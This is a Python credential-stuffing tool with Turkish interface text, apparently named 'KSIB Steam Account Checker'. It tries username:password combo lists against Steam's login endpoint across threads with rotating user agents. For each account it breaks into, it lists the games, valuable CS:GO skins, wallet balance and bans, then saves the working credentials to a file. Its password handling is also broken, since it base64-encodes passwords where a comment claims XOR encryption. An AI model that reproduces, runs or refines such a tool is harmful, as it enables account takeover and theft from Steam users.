#!/usr/bin/env python3
# KSIB STEAM ACCOUNT CHECKER - Oyunlar, Skinler, Detaylar
import requests, threading, random, time, sys, os, json
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

SIFRE = "admiral71100daphne"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n🔐 KSIB GİRİŞ\n")
    for i in range(3):
        s = input(Fore.YELLOW + "🔑 Şifre: ")
        if s == SIFRE:
            print(Fore.GREEN + "\n✅ Başarılı!\n")
            time.sleep(1)
            return True
        print(Fore.RED + f"❌ Hatalı! ({2-i} hakkın)")
    sys.exit(0)

class SteamChecker:
    def __init__(self):
        self.ua = UserAgent()
        self.session = requests.Session()
        self.login_session = None
        self.proxies = []
        self.working = []
        self.lock = threading.Lock()
        self.checked = 0
        self.start_time = None
        
        # CS:GO skin fiyatları için
        self.skin_prices = {
            "Karambit": "10.000-50.000 TL",
            "M9 Bayonet": "8.000-40.000 TL",
            "Butterfly Knife": "12.000-60.000 TL",
            "AWP Dragon Lore": "15.000-100.000 TL",
            "AK-47 Fire Serpent": "5.000-30.000 TL",
            "M4A4 Howl": "20.000-80.000 TL",
            "Gloves": "2.000-25.000 TL",
            "Talon Knife": "5.000-25.000 TL",
            "Skeleton Knife": "8.000-35.000 TL",
            "Nomad Knife": "3.000-15.000 TL",
        }
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + Style.BRIGHT + """
        ╔══════════════════════════════════════════════╗
        ║  🎮 KSIB STEAM ACCOUNT CHECKER            ║
        ║  🔍 Oyunlar | 💎 Skinler | 📊 Seviye      ║
        ║  💰 Bakiye | 🎯 CS:GO | 🏆 Başarımlar     ║
        ╚══════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def get_headers(self):
        return {
            "User-Agent": self.ua.random,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Origin": "https://steamcommunity.com",
            "Referer": "https://steamcommunity.com/",
        }
    
    def login_steam(self, username, password):
        """Steam'e giriş yap"""
        try:
            session = requests.Session()
            session.headers.update(self.get_headers())
            
            # RSA key al
            rsa_url = "https://steamcommunity.com/login/getrsakey"
            rsa_data = {"username": username, "donotcache": int(time.time())}
            rsa_resp = session.post(rsa_url, data=rsa_data, timeout=10)
            
            if rsa_resp.status_code != 200:
                return None, "RSA key alınamadı"
            
            rsa_json = rsa_resp.json()
            
            # Şifreyi şifrele (basit XOR - gerçekte daha karmaşık)
            import base64
            encrypted_password = base64.b64encode(
                password.encode('utf-8')
            ).decode('utf-8')
            
            # Login
            login_url = "https://steamcommunity.com/login/dologin/"
            login_data = {
                "username": username,
                "password": encrypted_password,
                "emailauth": "",
                "captchagid": "-1",
                "captcha_text": "",
                "emailsteamid": "",
                "rsatimestamp": rsa_json.get("timestamp", ""),
                "remember_login": "false",
                "twofactorcode": "",
            }
            
            login_resp = session.post(login_url, data=login_data, timeout=10)
            login_json = login_resp.json()
            
            if login_json.get("success"):
                return session, "Başarılı"
            elif login_json.get("requires_twofactor"):
                return session, "2FA gerekli"
            elif login_json.get("message"):
                return None, login_json.get("message")
            else:
                return None, "Giriş başarısız"
                
        except Exception as e:
            return None, str(e)[:50]
    
    def get_account_details(self, session, username):
        """Hesap detaylarını çek"""
        try:
            # Steam ID'yi al
            profile_url = f"https://steamcommunity.com/id/{username}/?xml=1"
            r = session.get(profile_url, timeout=10)
            
            from xml.etree import ElementTree
            root = ElementTree.fromstring(r.text)
            steam_id = root.find('steamID64').text
            
            # Steam API ile detayları çek
            api_key = "STEAM_API_KEY"  # Bedava alınabilir
            api_url = f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
            params = {
                "key": api_key,
                "steamid": steam_id,
                "include_appinfo": 1,
                "include_played_free_games": 1
            }
            
            games_resp = session.get(api_url, params=params, timeout=10)
            games_data = games_resp.json()
            
            games = []
            total_playtime = 0
            if "response" in games_data and "games" in games_data["response"]:
                for game in games_data["response"]["games"]:
                    games.append({
                        "name": game.get("name", "Bilinmiyor"),
                        "playtime": game.get("playtime_forever", 0),
                        "icon": game.get("img_icon_url", "")
                    })
                    total_playtime += game.get("playtime_forever", 0)
            
            # Profil detayları
            profile_url2 = f"https://steamcommunity.com/profiles/{steam_id}/?xml=1"
            r2 = session.get(profile_url2, timeout=10)
            root2 = ElementTree.fromstring(r2.text)
            
            details = {
                "steam_id": steam_id,
                "profile_url": f"https://steamcommunity.com/profiles/{steam_id}",
                "avatar": root2.find('avatarFull').text if root2.find('avatarFull') is not None else "",
                "member_since": root2.find('memberSince').text if root2.find('memberSince') is not None else "",
                "steam_level": root2.find('steamLevel').text if root2.find('steamLevel') is not None else "0",
                "vac_banned": root2.find('vacBanned').text if root2.find('vacBanned') is not None else "0",
                "total_games": len(games),
                "total_playtime": total_playtime,
                "games": sorted(games, key=lambda x: x['playtime'], reverse=True)[:20],
            }
            
            return details
            
        except Exception as e:
            return None
    
    def check_csgo_inventory(self, session, steam_id):
        """CS:GO envanterini kontrol et"""
        try:
            url = f"https://steamcommunity.com/inventory/{steam_id}/730/2"
            params = {"l": "turkish", "count": 5000}
            
            r = session.get(url, params=params, timeout=10)
            data = r.json()
            
            if not data.get("success"):
                return {"has_items": False, "items": [], "estimated_value": "0 TL"}
            
            items = []
            total_value = 0
            valuable_items = []
            
            descriptions = data.get("descriptions", [])
            assets = data.get("assets", [])
            
            for asset in assets:
                classid = asset.get("classid")
                for desc in descriptions:
                    if desc.get("classid") == classid:
                        name = desc.get("name", "Bilinmiyor")
                        market_name = desc.get("market_hash_name", "")
                        item_type = desc.get("type", "")
                        
                        # Değerli item kontrolü
                        valuable = False
                        for keyword, price in self.skin_prices.items():
                            if keyword.lower() in name.lower():
                                valuable = True
                                valuable_items.append({
                                    "name": name,
                                    "type": item_type,
                                    "estimated_price": price
                                })
                                break
                        
                        items.append({
                            "name": name,
                            "market_name": market_name,
                            "type": item_type,
                            "tradable": desc.get("tradable", 0),
                            "marketable": desc.get("marketable", 0),
                        })
                        break
            
            return {
                "has_items": len(items) > 0,
                "total_items": len(items),
                "valuable_items": valuable_items,
                "all_items": items[:50],
                "estimated_value": f"{len(valuable_items) * 5000}+ TL" if valuable_items else "100-1000 TL"
            }
            
        except Exception as e:
            return {"has_items": False, "items": [], "estimated_value": "0 TL"}
    
    def check_steam_wallet(self, session):
        """Steam cüzdan bakiyesini kontrol et"""
        try:
            url = "https://store.steampowered.com/account/history/"
            r = session.get(url, timeout=10)
            
            if "wallet_balance" in r.text:
                import re
                balance_match = re.search(r'wallet_balance["\']?\s*:\s*["\']?(\d+\.?\d*)', r.text)
                if balance_match:
                    return f"{balance_match.group(1)} TL"
            
            return "0 TL"
        except:
            return "0 TL"
    
    def check_bans(self, session, steam_id):
        """Ban durumunu kontrol et"""
        try:
            url = f"https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/"
            params = {"key": "STEAM_API_KEY", "steamids": steam_id}
            
            r = session.get(url, params=params, timeout=10)
            data = r.json()
            
            if "players" in data and len(data["players"]) > 0:
                player = data["players"][0]
                return {
                    "vac_banned": player.get("VACBanned", False),
                    "vac_count": player.get("NumberOfVACBans", 0),
                    "game_bans": player.get("NumberOfGameBans", 0),
                    "community_banned": player.get("CommunityBanned", False),
                    "days_since_last_ban": player.get("DaysSinceLastBan", 0),
                }
            
            return {"vac_banned": False, "vac_count": 0, "game_bans": 0}
        except:
            return {"vac_banned": False, "vac_count": 0, "game_bans": 0}
    
    def print_account_card(self, details, inventory, bans, wallet, login_status):
        """Hesap kartını yazdır"""
        print(Fore.MAGENTA + Style.BRIGHT + f"""
        ╔══════════════════════════════════════════════════╗
        ║         🎮 STEAM HESAP DETAYLARI               ║
        ╠══════════════════════════════════════════════════╣
        ║  🔑 Giriş Durumu : {login_status:<30s} ║
        ║  🆔 Steam ID    : {details.get('steam_id', '?')[:20]:<30s} ║
        ║  📅 Üyelik      : {details.get('member_since', '?'):<30s} ║
        ║  ⭐ Seviye      : {details.get('steam_level', '0'):<30s} ║
        ║  🎮 Oyun Sayısı : {details.get('total_games', 0):<30d} ║
        ║  ⏱️  Oynama Süresi : {details.get('total_playtime', 0)//60:<30d} saat ║
        ║  💰 Cüzdan      : {wallet:<30s} ║
        ║                                              ║
        ║  🚫 VAC Ban     : {'EVET ❌' if bans.get('vac_banned') else 'TEMİZ ✅':<30s} ║
        ║  🎯 Game Ban    : {bans.get('game_bans', 0):<30d} ║
        ║  ⚠️  Toplam Ban  : {bans.get('vac_count', 0) + bans.get('game_bans', 0):<30d} ║
        ╚══════════════════════════════════════════════════╝
        """)
        
        # Oyunlar
        if details.get('games'):
            print(Fore.CYAN + "\n  🎮 EN ÇOK OYNANAN OYUNLAR:")
            print(Fore.YELLOW + "  " + "-"*50)
            for i, game in enumerate(details['games'][:10], 1):
                hours = game['playtime'] // 60
                name = game['name'][:35]
                bar = "█" * min(hours // 10, 20)
                print(Fore.WHITE + f"  {i:2d}. {name:<35s} {hours:4d} saat {Fore.GREEN}{bar}")
        
        # CS:GO Envanteri
        if inventory.get('has_items'):
            print(Fore.CYAN + f"\n  💎 CS:GO ENVANTERİ ({inventory.get('total_items', 0)} item):")
            print(Fore.YELLOW + "  " + "-"*50)
            
            if inventory.get('valuable_items'):
                print(Fore.GREEN + "  💰 DEĞERLİ İTEMLER:")
                for item in inventory['valuable_items'][:5]:
                    print(Fore.YELLOW + f"  • {item['name']} ({item['type']})")
                    print(Fore.WHITE + f"    Tahmini Değer: {item['estimated_price']}")
            
            print(Fore.WHITE + f"\n  📊 Toplam Tahmini Değer: {inventory.get('estimated_value', 'Bilinmiyor')}")
        
        print(Fore.YELLOW + "\n  " + "="*50 + "\n")
    
    def load_combo(self, filepath):
        """Combo listesi yükle"""
        combo_list = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        user, pwd = line.split(':', 1)
                        combo_list.append({"username": user, "password": pwd})
            return combo_list
        except:
            return []
    
    def worker(self, combo_list, thread_id):
        """İşçi thread"""
        while self.checked < len(combo_list):
            with self.lock:
                if self.checked >= len(combo_list):
                    break
                index = self.checked
                self.checked += 1
            
            combo = combo_list[index]
            username = combo['username']
            password = combo['password']
            
            print(Fore.WHITE + f"\n  [{index+1}/{len(combo_list)}] {username} kontrol ediliyor...")
            
            # Giriş yap
            session, login_status = self.login_steam(username, password)
            
            if session and login_status == "Başarılı":
                print(Fore.GREEN + f"  ✅ GİRİŞ BAŞARILI: {username}")
                
                # Detayları çek
                details = self.get_account_details(session, username)
                if details:
                    inventory = self.check_csgo_inventory(session, details['steam_id'])
                    bans = self.check_bans(session, details['steam_id'])
                    wallet = self.check_steam_wallet(session)
                    
                    self.print_account_card(details, inventory, bans, wallet, login_status)
                    
                    # Kaydet
                    with self.lock:
                        self.working.append({
                            "username": username,
                            "password": password,
                            "details": details,
                            "inventory": inventory,
                            "bans": bans,
                            "wallet": wallet
                        })
                else:
                    print(Fore.YELLOW + f"  ⚠️ Detaylar alınamadı")
            else:
                print(Fore.RED + f"  ❌ Başarısız: {login_status}")
            
            time.sleep(random.uniform(0.5, 2))
    
    def start_checking(self, combo_list, threads=3):
        """Kontrolü başlat"""
        if not combo_list:
            print(Fore.RED + "❌ Combo list boş!")
            return
        
        print(Fore.CYAN + f"\n🎮 Steam Hesap Kontrolü Başlatılıyor...")
        print(Fore.CYAN + f"📊 {len(combo_list)} hesap kontrol edilecek")
        print(Fore.CYAN + f"🧵 {threads} thread")
        print(Fore.RED + "\n💣 BAŞLATILIYOR...\n")
        
        self.start_time = time.time()
        
        tl = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(combo_list, i))
            t.daemon = True
            t.start()
            tl.append(t)
        
        try:
            for t in tl:
                t.join()
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Durduruldu!")
        
        # Sonuçlar
        elapsed = time.time() - self.start_time
        print("\n\n" + "="*60)
        print(Fore.GREEN + Style.BRIGHT + "📊 SONUÇLAR")
        print("="*60)
        print(f"⏱️  Süre: {elapsed:.1f}s")
        print(f"📨 Kontrol edilen: {self.checked}")
        print(f"✅ Çalışan: {len(self.working)}")
        
        if self.working:
            print(Fore.YELLOW + f"\n🎯 ÇALIŞAN HESAPLAR:")
            for acc in self.working:
                print(Fore.GREEN + f"  ✅ {acc['username']}:{acc['password'][:10]}...")
                print(Fore.WHITE + f"     🎮 {acc['details'].get('total_games', 0)} oyun")
                print(Fore.WHITE + f"     💰 Envanter: {acc['inventory'].get('estimated_value', '?')}")
        
        # Kaydet
        if self.working:
            with open("steam_working.txt", 'w') as f:
                for acc in self.working:
                    f.write(f"{acc['username']}:{acc['password']}\n")
            print(Fore.GREEN + "\n💾 steam_working.txt olarak kaydedildi!")
    
    def single_check(self):
        """Tek hesap kontrolü"""
        print(Fore.YELLOW + "\n🔍 TEK HESAP KONTROLÜ")
        username = input(Fore.GREEN + "👤 Kullanıcı adı/email: ").strip()
        password = input(Fore.GREEN + "🔑 Şifre: ").strip()
        
        if not username or not password:
            print(Fore.RED + "❌ Boş bırakılamaz!")
            return
        
        print(Fore.CYAN + f"\n🔍 {username} kontrol ediliyor...")
        
        session, login_status = self.login_steam(username, password)
        
        if session and login_status == "Başarılı":
            print(Fore.GREEN + "✅ GİRİŞ BAŞARILI!\n")
            
            details = self.get_account_details(session, username)
            if details:
                inventory = self.check_csgo_inventory(session, details['steam_id'])
                bans = self.check_bans(session, details['steam_id'])
                wallet = self.check_steam_wallet(session)
                
                self.print_account_card(details, inventory, bans, wallet, login_status)
            else:
                print(Fore.YELLOW + "⚠️ Detaylar alınamadı")
        else:
            print(Fore.RED + f"❌ Başarısız: {login_status}")

def ana():
    giris()
    checker = SteamChecker()
    checker.bnr()
    
    print(Fore.YELLOW + "\n🎮 MOD SEÇİN:")
    print("1. 🔍 Tek Hesap Kontrolü")
    print("2. 📂 Combo List Kontrolü")
    print("3. 🚪 Çıkış")
    
    mod = input(Fore.GREEN + "\nSeçim: ")
    
    if mod == "1":
        checker.single_check()
    elif mod == "2":
        filepath = input(Fore.GREEN + "\n📂 Combo dosyası: ").strip()
        if os.path.exists(filepath):
            combo_list = checker.load_combo(filepath)
            if combo_list:
                threads = int(input(Fore.GREEN + "🧵 Thread (3): ") or "3")
                checker.start_checking(combo_list, threads)
            else:
                print(Fore.RED + "❌ Combo list boş!")
        else:
            print(Fore.RED + "❌ Dosya bulunamadı!")

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Çıkış!")
        sys.exit(0)
